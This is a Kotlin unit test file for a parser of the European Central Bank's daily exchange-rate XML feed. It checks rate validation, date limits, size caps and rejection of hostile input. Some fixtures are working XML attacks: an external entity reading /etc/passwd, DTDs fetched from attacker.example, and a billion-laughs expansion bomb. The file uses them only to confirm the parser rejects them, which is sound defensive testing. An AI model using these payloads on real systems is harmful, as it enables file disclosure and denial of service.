package com.pixel.intelligentsearch.core.currency

import com.pixel.intelligentsearch.core.net.HttpsClient
import com.pixel.intelligentsearch.core.net.HttpsCall
import org.junit.Assert.assertArrayEquals
import org.junit.Assert.assertEquals
import org.junit.Assert.assertNotNull
import org.junit.Assert.assertNull
import org.junit.Assert.assertTrue
import org.junit.Test
import java.io.ByteArrayInputStream
import java.io.InputStream
import java.time.LocalDate

/** The ECB feed is network input: well-formed files parse, and malformed, hostile or oversized ones never do. */
class EcbRatesParserTest {

    private fun parse(xml: String) = EcbRatesParser.parse(xml.toByteArray(Charsets.UTF_8))

    @Test
    fun theDailyFileParsesToPerEuroRates() {
        val rates = parse(ecbFile())!!
        assertEquals("eur", rates.base)
        assertEquals(LocalDate.of(2026, 10, 19), rates.date)
        assertEquals(1.0812, rates.perBase.getValue("usd"), 0.0)
        assertEquals(162.5, rates.perBase.getValue("jpy"), 0.0)
        assertEquals(0.8411, rates.perBase.getValue("gbp"), 0.0)
        assertEquals(1.0, rates.perBase.getValue("eur"), 0.0)
        assertEquals(setOf("usd", "jpy", "gbp", "pln", "eur"), rates.perBase.keys)
    }

    @Test
    fun aByteOrderMarkAndOtherWhitespaceAreFine() {
        val withBom = byteArrayOf(0xEF.toByte(), 0xBB.toByte(), 0xBF.toByte()) + ecbFile().toByteArray()
        assertEquals(LocalDate.of(2026, 10, 19), EcbRatesParser.parse(withBom)?.date)
    }

    @Test
    fun onlyThreeLetterUpperCaseCodesWithPositiveFiniteRatesAreKept() {
        val rates = parse(
            ecbFile(
                rates = """
                <Cube currency='USD' rate='1.0812'/>
                <Cube currency='usd' rate='2'/>
                <Cube currency='US' rate='2'/>
                <Cube currency='USDX' rate='2'/>
                <Cube currency='U5D' rate='2'/>
                <Cube currency='EUR' rate='3'/>
                <Cube currency='AAA' rate='0'/>
                <Cube currency='BBB' rate='-1.5'/>
                <Cube currency='CCC' rate='NaN'/>
                <Cube currency='DDD' rate='Infinity'/>
                <Cube currency='EEE' rate='1e400'/>
                <Cube currency='FFF' rate='1,25'/>
                <Cube currency='GGG' rate=''/>
                <Cube currency='HHH'/>
                <Cube rate='4'/>
                <Cube currency='JPY' rate='162.5'/>
                <Cube currency='JPY' rate='999'/>
                """
            )
        )!!
        // The first JPY wins, EUR stays the base at 1.
        assertEquals(mapOf("usd" to 1.0812, "jpy" to 162.5, "eur" to 1.0), rates.perBase)
    }

    @Test
    fun aFileWithoutAUsableDateOrAnyRateIsRejected() {
        assertNull(parse(ecbFile(time = null)))
        assertNull(parse(ecbFile(time = "2026-13-45")))
        assertNull(parse(ecbFile(time = "yesterday")))
        assertNull(parse(ecbFile(rates = "")))
        assertNull(parse(ecbFile(rates = "<Cube currency='usd' rate='-1'/>")))
    }

    @Test
    fun aTableDatedMoreThanTwoDaysAheadIsRejected() {
        val today = LocalDate.of(2026, 10, 20)
        fun dated(time: String) = EcbRatesParser.parse(ecbFile(time = time).toByteArray(), today)?.date
        assertEquals(LocalDate.of(2026, 10, 19), dated("2026-10-19"))
        assertEquals(LocalDate.of(2026, 10, 20), dated("2026-10-20"))
        // A time zone or a clock a little behind.
        assertEquals(LocalDate.of(2026, 10, 22), dated("2026-10-22"))
        assertNull(dated("2026-10-23"))
        assertNull(dated("2099-12-31"))
    }

    @Test
    fun ratesOutsideAPlausibleRangeAreDropped() {
        val rates = parse(
            ecbFile(
                rates = """
                <Cube currency='USD' rate='1.0812'/>
                <Cube currency='AAA' rate='0.000001'/>
                <Cube currency='BBB' rate='0.0000009'/>
                <Cube currency='CCC' rate='10000000'/>
                <Cube currency='DDD' rate='10000001'/>
                <Cube currency='EEE' rate='999999999999'/>
                """
            )
        )!!
        assertEquals(mapOf("usd" to 1.0812, "aaa" to 0.000001, "ccc" to 10_000_000.0, "eur" to 1.0), rates.perBase)
    }

    @Test
    fun malformedInputIsRejected() {
        assertNull(EcbRatesParser.parse(ByteArray(0)))
        assertNull(parse(""))
        assertNull(parse("not xml at all"))
        assertNull(parse("<html><body>Service unavailable</body></html>"))
        assertNull(parse(ecbFile().dropLast(40))) // cut off mid-file
        assertNull(parse(ecbFile().replace("</Cube>", "</Cub>")))
        assertNull(EcbRatesParser.parse(ByteArray(4096) { (it * 31).toByte() }))
    }

    @Test
    fun externalEntitiesAreNeverResolved() {
        val xxe = """<?xml version="1.0"?>
            <!DOCTYPE gesmes:Envelope [<!ENTITY rate SYSTEM "file:///etc/passwd">]>
            ${ecbFile(rates = "<Cube currency='USD' rate='&rate;'/>", prolog = false)}"""
        assertNull(parse(xxe))
        val remote = """<?xml version="1.0"?>
            <!DOCTYPE gesmes:Envelope SYSTEM "https://attacker.example/evil.dtd">
            ${ecbFile(prolog = false)}"""
        assertNull(parse(remote))
        val parameter = """<?xml version="1.0"?>
            <!DOCTYPE x [<!ENTITY % remote SYSTEM "https://attacker.example/p.dtd"> %remote;]>
            ${ecbFile(prolog = false)}"""
        assertNull(parse(parameter))
    }

    @Test
    fun entityExpansionBombsAreRejected() {
        val laughs = buildString {
            append("<?xml version=\"1.0\"?>\n<!DOCTYPE lolz [\n<!ENTITY lol \"lol\">\n")
            for (i in 1..9) append("<!ENTITY lol$i \"${"&lol${if (i == 1) "" else i - 1};".repeat(10)}\">\n")
            append("]>\n")
            append(ecbFile(rates = "<Cube currency='USD' rate='1.08'/><Cube currency='LOL' rate='&lol9;'/>", prolog = false))
        }
        assertNull(parse(laughs))
        // However it is spelled.
        assertNull(parse(laughs.replace("<!DOCTYPE", "<!doctype")))
    }

    @Test
    fun aDoctypeHiddenByAnotherEncodingIsNotParsed() {
        val utf16 = ("<?xml version=\"1.0\" encoding=\"UTF-16\"?><!DOCTYPE x [<!ENTITY e \"1\">]>" + ecbFile(prolog = false))
            .toByteArray(Charsets.UTF_16)
        assertNull(EcbRatesParser.parse(utf16))
    }

    @Test
    fun hugeInputIsRejectedUnread() {
        val padding = " ".repeat(EcbRatesParser.MAX_BYTES)
        assertNull(parse(ecbFile().replace("<Cube>", "<Cube>$padding")))
        assertNull(EcbRatesParser.parse(ByteArray(10 * 1024 * 1024) { 'a'.code.toByte() }))
        // Just under the limit is still fine.
        val file = ecbFile()
        val fits = file.replace("<Cube>", "<Cube>" + " ".repeat(EcbRatesParser.MAX_BYTES - file.length))
        assertEquals(EcbRatesParser.MAX_BYTES, fits.toByteArray().size)
        assertNotNull(parse(fits))
    }

    @Test
    fun aFileListingFarMoreCurrenciesThanTheEcbIsRejected() {
        val many = ('A'..'Z').flatMap { a -> ('A'..'J').map { b -> "<Cube currency='Q$a$b' rate='1.5'/>" } }
        assertTrue(many.size > 200)
        assertNull(parse(ecbFile(rates = many.joinToString(""))))
    }

    @Test
    fun aBodyIsReadOnlyUpToTheLimit() {
        val small = ecbFile().toByteArray()
        assertArrayEquals(small, HttpsClient.readCapped(ByteArrayInputStream(small), EcbRatesParser.MAX_BYTES))

        // An endless body: reading stops just past the limit instead of running out of memory.
        var served = 0L
        val endless = object : InputStream() {
            override fun read(): Int = 'x'.code.also { served++ }
            override fun read(b: ByteArray, off: Int, len: Int): Int {
                b.fill('x'.code.toByte(), off, off + len)
                served += len
                return len
            }
        }
        assertNull(HttpsClient.readCapped(endless, EcbRatesParser.MAX_BYTES))
        assertTrue("read $served bytes", served <= EcbRatesParser.MAX_BYTES + 8 * 1024)
    }

    @Test
    fun plainHttpAndOtherSchemesAreRefusedWithoutAConnection() {
        val client = HttpsClient()
        assertNull(client.get("http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml", EcbRatesParser.MAX_BYTES, HttpsCall()))
        assertNull(client.get("file:///etc/hosts", EcbRatesParser.MAX_BYTES, HttpsCall()))
        assertNull(client.get("not a url", EcbRatesParser.MAX_BYTES, HttpsCall()))
    }

    companion object {
        /** The shape of eurofxref-daily.xml, trimmed to a few currencies. */
        fun ecbFile(
            time: String? = "2026-10-19",
            rates: String = """
                <Cube currency='USD' rate='1.0812'/>
                <Cube currency='JPY' rate='162.50'/>
                <Cube currency='GBP' rate='0.84110'/>
                <Cube currency='PLN' rate='4.2735'/>
            """,
            prolog: Boolean = true
        ): String = (if (prolog) "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" else "") + """
            <gesmes:Envelope xmlns:gesmes="http://www.gesmes.org/xml/2002-08-01" xmlns="http://www.ecb.int/vocabulary/2002-08-01/eurofxref">
                <gesmes:subject>Reference rates</gesmes:subject>
                <gesmes:Sender>
                    <gesmes:name>European Central Bank</gesmes:name>
                </gesmes:Sender>
                <Cube>
                    <Cube${if (time != null) " time='$time'" else ""}>
                        $rates
                    </Cube>
                </Cube>
            </gesmes:Envelope>
        """.trimIndent()
    }
}
